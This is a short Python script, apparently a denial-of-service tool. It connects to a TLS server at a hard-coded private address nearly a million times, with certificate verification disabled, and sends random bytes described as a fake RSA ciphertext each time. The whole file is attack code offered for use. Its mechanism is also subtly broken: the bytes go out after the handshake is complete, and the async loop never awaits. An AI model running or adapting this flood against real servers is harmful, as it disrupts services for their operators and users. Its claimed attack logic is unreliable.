import socket
import ssl
import os
import asyncio
SERVER_ADDRESS = "10.0.2.4"
SERVER_PORT = 4443
REPEAT_COUNT = 999999
SERVER_PUBLIC_KEY_SIZE = 2048
def create_tcp_connection(server_address, server_port):
    try:
        tcp_socket = socket.create_connection((server_address, server_port))
        return tcp_socket
    except Exception as e:
        return None
def perform_tls_handshake(tcp_socket, server_address):
    try:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        ssl_context.verify_mode = ssl.CERT_NONE
        ssl_context.check_hostname = False
        tls_socket = ssl_context.wrap_socket(tcp_socket, server_hostname=server_address)
        return tls_socket
    except Exception as e:
        return None
def generate_fake_rsa_cipher(server_public_key_size):
    try:
        byte_size = server_public_key_size // 8
        fake_cipher = os.urandom(byte_size)
        return fake_cipher
    except Exception as e:
        return None
def send_fake_rsa_cipher(tls_socket, fake_cipher):
    try:
        tls_socket.send(fake_cipher)
    except Exception as e:
        return None
def ignore_server_response(tls_socket):
    pass
async def attack(server_address, server_port, repeat_count, server_public_key_size):    
    for i in range(repeat_count):
        tcp_socket = create_tcp_connection(server_address, server_port)
        if not tcp_socket:
            continue
        tls_socket = perform_tls_handshake(tcp_socket, server_address)
        if not tls_socket:
            tcp_socket.close()
            continue
        fake_cipher = generate_fake_rsa_cipher(server_public_key_size)
        if not fake_cipher:
            tls_socket.close()
            continue
        send_fake_rsa_cipher(tls_socket, fake_cipher)
        ignore_server_response(tls_socket)
        tls_socket.close()
        tcp_socket.close()
if __name__ == "__main__":
    asyncio.run(attack(SERVER_ADDRESS, SERVER_PORT, REPEAT_COUNT, SERVER_PUBLIC_KEY_SIZE))